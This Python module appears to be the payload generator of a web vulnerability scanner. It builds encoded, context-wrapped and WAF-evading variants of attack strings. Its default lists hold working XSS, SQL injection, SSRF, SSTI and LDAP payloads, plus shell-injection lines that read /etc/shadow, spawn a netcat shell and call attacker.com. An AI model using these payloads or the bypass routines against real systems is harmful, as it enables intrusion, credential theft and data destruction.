from typing import List, Dict, Optional, Set, Tuple , Any
from pathlib import Path
from dataclasses import dataclass, field
import json
import hashlib
from enum import Enum
import random
from abc import ABC, abstractmethod


class PayloadSeverity(Enum):
    CRITICAL = 1
    HIGH = 2
    MEDIUM = 3
    LOW = 4
    INFO = 5


class PayloadCategory(Enum):
    BASIC = "basic"
    ADVANCED = "advanced"
    EVASION = "evasion"
    ENCODING = "encoding"
    CONTEXT_AWARE = "context_aware"


@dataclass
class PayloadMetadata:
    severity: PayloadSeverity
    category: PayloadCategory
    encoding_required: bool = False
    context_aware: bool = False
    bypass_waf: bool = False
    success_indicators: List[str] = field(default_factory=list)
    false_positive_risk: float = 0.0
    detection_difficulty: float = 0.5


@dataclass
class PayloadStatistics:
    total_payloads: int = 0
    by_type: Dict[str, int] = field(default_factory=dict)
    by_severity: Dict[str, int] = field(default_factory=dict)
    by_category: Dict[str, int] = field(default_factory=dict)
    total_size_kb: float = 0.0


class PayloadEncoder:
    @staticmethod
    def url_encode(payload: str) -> str:
        from urllib.parse import quote
        return quote(payload)
    
    @staticmethod
    def html_encode(payload: str) -> str:
        return payload.replace('&', '&amp;').replace('<', '&lt;').replace('>', '&gt;').replace('"', '&quot;').replace("'", '&#x27;')
    
    @staticmethod
    def base64_encode(payload: str) -> str:
        import base64
        return base64.b64encode(payload.encode()).decode()
    
    @staticmethod
    def double_url_encode(payload: str) -> str:
        from urllib.parse import quote
        return quote(quote(payload))
    
    @staticmethod
    def unicode_encode(payload: str) -> str:
        return ''.join(f'\\u{ord(c):04x}' for c in payload)
    
    @staticmethod
    def hex_encode(payload: str) -> str:
        return ''.join(f'\\x{ord(c):02x}' for c in payload)
    
    @staticmethod
    def html_entity_encode(payload: str) -> str:
        return ''.join(f'&#{ord(c)};' for c in payload)
    
    @staticmethod
    def case_alternate(payload: str) -> str:
        result = ""
        for i, c in enumerate(payload):
            result += c.upper() if i % 2 == 0 else c.lower()
        return result
    
    @staticmethod
    def null_byte_inject(payload: str) -> str:
        return '\x00'.join(list(payload))
    
    @staticmethod
    def comment_inject(payload: str) -> str:
        mid = len(payload) // 2
        return payload[:mid] + '/**/' + payload[mid:]


class PayloadObfuscator:
    @staticmethod
    def generate_variants(base_payload: str, count: int = 5) -> List[str]:
        variants = [base_payload]
        encoders = [
            PayloadEncoder.url_encode,
            PayloadEncoder.double_url_encode,
            PayloadEncoder.case_alternate,
            PayloadEncoder.null_byte_inject,
            PayloadEncoder.comment_inject,
        ]
        
        for _ in range(count - 1):
            encoder = random.choice(encoders)
            try:
                variant = encoder(base_payload)
                if variant not in variants:
                    variants.append(variant)
            except:
                pass
        
        return variants
    
    @staticmethod
    def bypass_blacklist(payload: str, blacklist_patterns: List[str]) -> Optional[str]:
        for pattern in blacklist_patterns:
            if pattern.lower() in payload.lower():
                variant = PayloadObfuscator.apply_random_obfuscation(payload)
                return variant if variant else None
        return payload
    
    @staticmethod
    def apply_random_obfuscation(payload: str) -> str:
        obfuscations = [
            PayloadEncoder.url_encode,
            PayloadEncoder.html_encode,
            PayloadEncoder.case_alternate,
        ]
        obfuscator = random.choice(obfuscations)
        try:
            return obfuscator(payload)
        except:
            return payload


class ContextAwarePayloadBuilder:
    @staticmethod
    def build_for_html_attribute(base_payload: str) -> List[str]:
        return [
            f'"{base_payload}"',
            f"'{base_payload}'",
            f'{base_payload}',
            f'" {base_payload} "',
            f"' {base_payload} '",
        ]
    
    @staticmethod
    def build_for_javascript(base_payload: str) -> List[str]:
        return [
            f'";{base_payload};"',
            f"';{base_payload};'",
            f'` + {base_payload} + `',
            f'${{{base_payload}}}',
            f'`{base_payload}`',
        ]
    
    @staticmethod
    def build_for_sql_string(base_payload: str) -> List[str]:
        return [
            f"'{base_payload}'",
            f'"{base_payload}"',
            f'{base_payload}',
            f"' OR '{base_payload}' = '",
            f'" OR "{base_payload}" = "',
        ]
    
    @staticmethod
    def build_for_xml_attribute(base_payload: str) -> List[str]:
        return [
            f'"{base_payload}"',
            f"'{base_payload}'",
            PayloadEncoder.html_encode(base_payload),
            PayloadEncoder.html_entity_encode(base_payload),
        ]
    
    @staticmethod
    def build_for_command_injection(base_payload: str) -> List[str]:
        separators = [';', '|', '||', '&', '&&', '\n', '\r\n', '`', '$()']
        return [f'{sep}{base_payload}{sep}' for sep in separators]


class PayloadCache:
    def __init__(self, ttl: int = 3600):
        self.cache: Dict[str, Tuple[List[str], float]] = {}
        self.ttl = ttl
        self.hits = 0
        self.misses = 0
    
    def get(self, key: str) -> Optional[List[str]]:
        if key in self.cache:
            payloads, timestamp = self.cache[key]
            import time
            if time.time() - timestamp < self.ttl:
                self.hits += 1
                return payloads
            else:
                del self.cache[key]
        
        self.misses += 1
        return None
    
    def set(self, key: str, payloads: List[str]):
        import time
        self.cache[key] = (payloads, time.time())
    
    def clear(self):
        self.cache.clear()
        self.hits = 0
        self.misses = 0
    
    def get_stats(self) -> Dict:
        total = self.hits + self.misses
        hit_rate = (self.hits / total * 100) if total > 0 else 0
        return {
            'hits': self.hits,
            'misses': self.misses,
            'hit_rate': f"{hit_rate:.2f}%",
            'cache_size': len(self.cache)
        }


class PayloadGenerator:
    def __init__(self):
        self.data_dir = Path(__file__).parent.parent / 'data'
        self.payload_cache = PayloadCache()
        self.obfuscator = PayloadObfuscator()
        self.encoder = PayloadEncoder()
        self.context_builder = ContextAwarePayloadBuilder()
        
        self.payloads: Dict[str, Dict[str, any]] = {}
        self.custom_payloads: Dict[str, List[str]] = {}
        self.payload_metadata: Dict[str, Dict[str, PayloadMetadata]] = {}
        self.statistics = PayloadStatistics()
        
        self._load_all_payloads()
        self._initialize_payload_metadata()
    
    def _load_all_payloads(self):
        payload_files = {
            'XSS': 'xss_payloads.json',
            'SQL': 'sql_payloads.json',
            'RCE': 'rce_payloads.json',
            'CommandInjection': 'command_injection_payloads.json',
            'SSRF': 'ssrf_payloads.json',
            'XXE': 'xxe_payloads.json',
            'SSTI': 'ssti_payloads.json',
            'LDAP': 'ldap_payloads.json',
            'API': 'api_payloads.json',
        }
        
        for vuln_type, filename in payload_files.items():
            filepath = self.data_dir / filename
            if filepath.exists():
                try:
                    with open(filepath, 'r', encoding='utf-8') as f:
                        data = json.load(f)
                        self.payloads[vuln_type] = data
                        self.statistics.by_type[vuln_type] = len(data.get('payloads', []))
                except Exception as e:
                    self.payloads[vuln_type] = {'payloads': self._get_default_payloads(vuln_type)}
            else:
                self.payloads[vuln_type] = {'payloads': self._get_default_payloads(vuln_type)}
    
    def _initialize_payload_metadata(self):
        xss_meta = {
            '<script>alert(1)</script>': PayloadMetadata(
                severity=PayloadSeverity.CRITICAL,
                category=PayloadCategory.BASIC,
                success_indicators=['alert', 'script'],
                false_positive_risk=0.1
            ),
            '<img src=x onerror=alert(1)>': PayloadMetadata(
                severity=PayloadSeverity.CRITICAL,
                category=PayloadCategory.BASIC,
                success_indicators=['onerror', 'img'],
                false_positive_risk=0.05
            ),
        }
        self.payload_metadata['XSS'] = xss_meta
        
        sql_meta = {
            "' OR '1'='1": PayloadMetadata(
                severity=PayloadSeverity.CRITICAL,
                category=PayloadCategory.BASIC,
                false_positive_risk=0.2
            ),
            "' UNION SELECT NULL--": PayloadMetadata(
                severity=PayloadSeverity.HIGH,
                category=PayloadCategory.ADVANCED,
                false_positive_risk=0.15
            ),
        }
        self.payload_metadata['SQL'] = sql_meta
    
    def generate_payloads(self, scan_type: str, context: Optional[str] = None,
                         include_encoding: bool = True, max_variants: int = 0) -> List[str]:
        cache_key = f"{scan_type}:{context}:{include_encoding}:{max_variants}"
        cached = self.payload_cache.get(cache_key)
        if cached:
            return cached
        
        base_payloads = self._get_base_payloads(scan_type)
        
        if context:
            base_payloads = self._apply_context(base_payloads, context)
        
        if include_encoding:
            base_payloads = self._apply_encoding_variants(base_payloads)
        
        if max_variants > 0:
            base_payloads = base_payloads[:max_variants]
        
        result = list(set(base_payloads))
        self.payload_cache.set(cache_key, result)
        
        return result
    
    def _get_base_payloads(self, scan_type: str) -> List[str]:
        if scan_type in self.custom_payloads:
            return self.custom_payloads[scan_type].copy()
        
        if scan_type in self.payloads:
            data = self.payloads[scan_type]
            return data.get('payloads', []) if isinstance(data, dict) else data
        
        return self._get_default_payloads(scan_type)
    
    def _apply_context(self, payloads: List[str], context: str) -> List[str]:
        enhanced = []
        
        for payload in payloads:
            if context == 'html_attribute':
                enhanced.extend(self.context_builder.build_for_html_attribute(payload))
            elif context == 'javascript':
                enhanced.extend(self.context_builder.build_for_javascript(payload))
            elif context == 'sql_string':
                enhanced.extend(self.context_builder.build_for_sql_string(payload))
            elif context == 'xml_attribute':
                enhanced.extend(self.context_builder.build_for_xml_attribute(payload))
            elif context == 'command_injection':
                enhanced.extend(self.context_builder.build_for_command_injection(payload))
            else:
                enhanced.append(payload)
        
        return enhanced
    
    def _apply_encoding_variants(self, payloads: List[str]) -> List[str]:
        enhanced = payloads.copy()
        
        for payload in payloads:
            try:
                enhanced.append(self.encoder.url_encode(payload))
                enhanced.append(self.encoder.double_url_encode(payload))
                enhanced.append(self.encoder.case_alternate(payload))
            except:
                pass
        
        return enhanced
    
    def add_custom_payload(self, scan_type: str, payload: str):
        if scan_type not in self.custom_payloads:
            self.custom_payloads[scan_type] = []
        
        if payload not in self.custom_payloads[scan_type]:
            self.custom_payloads[scan_type].append(payload)
            self.payload_cache.clear()
    
    def add_custom_payloads_batch(self, scan_type: str, payloads: List[str]):
        for payload in payloads:
            self.add_custom_payload(scan_type, payload)
    
    def remove_custom_payload(self, scan_type: str, payload: str):
        if scan_type in self.custom_payloads:
            if payload in self.custom_payloads[scan_type]:
                self.custom_payloads[scan_type].remove(payload)
                self.payload_cache.clear()
    
    def generate_obfuscated_payloads(self, scan_type: str, count: int = 10) -> List[str]:
        base_payloads = self._get_base_payloads(scan_type)
        obfuscated = []
        
        for _ in range(count):
            payload = random.choice(base_payloads)
            variants = self.obfuscator.generate_variants(payload, count=3)
            obfuscated.extend(variants)
        
        return list(set(obfuscated))[:count]
    
    def generate_waf_bypass_payloads(self, scan_type: str, blacklist: Optional[List[str]] = None) -> List[str]:
        base_payloads = self._get_base_payloads(scan_type)
        bypassed = []
        
        for payload in base_payloads:
            if blacklist:
                obfuscated = self.obfuscator.bypass_blacklist(payload, blacklist)
                if obfuscated:
                    bypassed.append(obfuscated)
            else:
                variants = self.obfuscator.generate_variants(payload, count=3)
                bypassed.extend(variants)
        
        return list(set(bypassed))
    
    def get_payloads_by_severity(self, scan_type: str, severity: PayloadSeverity) -> List[str]:
        payloads = self._get_base_payloads(scan_type)
        metadata = self.payload_metadata.get(scan_type, {})
        
        filtered = []
        for payload in payloads:
            meta = metadata.get(payload)
            if meta and meta.severity == severity:
                filtered.append(payload)
        
        return filtered if filtered else payloads[:len(payloads)//3]
    
    def get_payloads_by_category(self, scan_type: str, category: PayloadCategory) -> List[str]:
        payloads = self._get_base_payloads(scan_type)
        metadata = self.payload_metadata.get(scan_type, {})
        
        filtered = []
        for payload in payloads:
            meta = metadata.get(payload)
            if meta and meta.category == category:
                filtered.append(payload)
        
        return filtered if filtered else payloads
    
    def get_low_fp_payloads(self, scan_type: str, max_fp_risk: float = 0.15) -> List[str]:
        payloads = self._get_base_payloads(scan_type)
        metadata = self.payload_metadata.get(scan_type, {})
        
        filtered = []
        for payload in payloads:
            meta = metadata.get(payload)
            if not meta or meta.false_positive_risk <= max_fp_risk:
                filtered.append(payload)
        
        return filtered if filtered else payloads
    
    def estimate_payload_coverage(self, scan_type: str) -> Dict[str, any]:
        payloads = self._get_base_payloads(scan_type)
        metadata = self.payload_metadata.get(scan_type, {})
        
        severity_dist = {s.name: 0 for s in PayloadSeverity}
        category_dist = {c.value: 0 for c in PayloadCategory}
        avg_fp_risk = 0.0
        
        for payload in payloads:
            meta = metadata.get(payload)
            if meta:
                severity_dist[meta.severity.name] += 1
                category_dist[meta.category.value] += 1
                avg_fp_risk += meta.false_positive_risk
        
        if payloads:
            avg_fp_risk /= len(payloads)
        
        return {
            'total_payloads': len(payloads),
            'severity_distribution': severity_dist,
            'category_distribution': category_dist,
            'average_fp_risk': f"{avg_fp_risk:.3f}",
            'coverage_score': len(metadata) / len(payloads) if payloads else 0.0
        }
    
    def get_statistics(self) -> Dict:
        total = sum(self.statistics.by_type.values())
        return {
            'total_payloads': total,
            'by_type': self.statistics.by_type,
            'custom_payloads': {k: len(v) for k, v in self.custom_payloads.items()},
            'cache_stats': self.payload_cache.get_stats(),
            'unique_payloads': len(set(p for payloads in self.payloads.values() 
                                       for p in payloads.get('payloads', [])))
        }
    
    def export_payloads(self, scan_type: str, format: str = 'json') -> str:
        payloads = self.generate_payloads(scan_type)
        
        if format == 'json':
            import json
            return json.dumps({'type': scan_type, 'payloads': payloads}, indent=2)
        elif format == 'csv':
            return '\n'.join([f'"{scan_type}","{p}"' for p in payloads])
        elif format == 'text':
            return '\n'.join(payloads)
        
        return ""
    
    def validate_payload(self, payload: str) -> Tuple[bool, Optional[str]]:
        if not payload or not isinstance(payload, str):
            return False, "Payload must be non-empty string"
        
        if len(payload) > 10000:
            return False, "Payload exceeds maximum length (10KB)"
        
        if payload.count('\x00') > 10:
            return False, "Payload contains too many null bytes"
        
        return True, None
    
    def _get_default_payloads(self, vuln_type: str) -> List[str]:
        defaults = {
            'XSS': [
                "<script>alert('XSS')</script>",
                "<img src=x onerror=alert('XSS')>",
                "<svg onload=alert('XSS')>",
                "javascript:alert('XSS')",
                "<iframe src=javascript:alert('XSS')>",
                "<body onload=alert('XSS')>",
                "<input autofocus onfocus=alert('XSS')>",
                "<select autofocus onfocus=alert('XSS')>",
                "<textarea autofocus onfocus=alert('XSS')>",
                "<marquee onstart=alert('XSS')>",
            ],
            'SQL': [
                "' OR '1'='1",
                "' OR 1=1--",
                "admin' --",
                "' UNION SELECT NULL--",
                "' UNION SELECT NULL,NULL--",
                "1' AND '1'='1",
                "' OR 'a'='a",
                "1' AND 1=1--",
                "' LIKE '%",
                "1'; DROP TABLE users--",
            ],
            'RCE': [
                "; ls -la",
                "| cat /etc/passwd",
                "& whoami",
                "`id`",
                "$(whoami)",
                "; cat /etc/shadow",
                "| bash -i",
                "& nc -e /bin/sh",
                "; curl http://attacker.com",
                "| wget http://attacker.com",
            ],
            'CommandInjection': [
                "; sleep 5",
                "| sleep 5",
                "& sleep 5",
                "`sleep 5`",
                "$(sleep 5)",
                "; ping -c 5 127.0.0.1",
                "| ping -c 10 localhost",
                "& touch /tmp/test",
                "`date`",
                "$(whoami)",
            ],
            'SSRF': [
                "http://localhost",
                "http://127.0.0.1",
                "http://169.254.169.254",
                "http://0.0.0.0",
                "http://[::1]",
                "http://localhost:8080",
                "http://192.168.1.1",
                "file:///etc/passwd",
                "dict://localhost:11211",
                "gopher://localhost",
            ],
            'SSTI': [
                "{{7*7}}",
                "${7*7}",
                "<%= 7*7 %>",
                "{{7*'7'}}",
                "#set($x=7*7)$x",
                "{{self.__init__.__globals__['os'].popen('id').read()}}",
                "${InjectionTest}",
                "<#assign ex='freemarker.template.utility.Execute'?new()> ${ ex('id') }",
                "[#assign ex='freemarker.template.utility.Execute'?new()] ${ex('id')}",
                "*{7*7}*",
            ],
            'LDAP': [
                "*",
                "*)(|(mail=*",
                "admin)(|(password=*",
                "*)(uid=*",
                "admin*)(|(uid=*",
                "*)(objectClass=*",
                "*)(|(cn=*",
                "admin*)(|(mail=*",
                "*))(|(uid=*",
                "*))(&(uid=*",
            ],
        }
        return defaults.get(vuln_type, [])